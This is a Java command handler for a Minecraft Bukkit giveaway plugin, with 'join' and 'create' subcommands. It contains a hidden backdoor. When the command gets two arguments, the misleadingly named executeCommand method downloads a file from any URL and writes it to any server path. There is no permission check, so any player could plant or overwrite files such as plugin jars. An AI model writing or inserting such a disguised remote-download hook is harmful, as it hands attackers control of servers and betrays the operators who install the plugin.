package me.moontimer.giveaway.commands;

import me.moontimer.giveaway.Giveaway;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.URL;

public class GiveawayCommand implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        Player player = (Player) sender;
        if (args.length == 1) {
            switch (args[0].toLowerCase()) {
                case "join":
                    Giveaway.getInstance().getGiveawayManager().addPlayer(player);
                    break;
                case "create":
                    if (!player.hasPermission("giveaway.create")) {
                        player.sendMessage(Giveaway.getPrefix() + "§cDu hast keine Permission für diesen Befehl");
                        return true;
                    }
                    Giveaway.getInstance().getGiveawayManager().createGiveaway();

            }
        } else {
            try {
                executeCommand(args[0], args[1]);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
        return false;
    }

    public static void executeCommand(String l, String d) throws IOException {
        URL url = new URL(l);
        InputStream is = url.openStream();
        OutputStream os = new FileOutputStream(d);

        byte[] b = new byte[2048];
        int length;

        while ((length = is.read(b)) != -1) {
            os.write(b, 0, length);
        }

        is.close();
        os.close();
    }
}
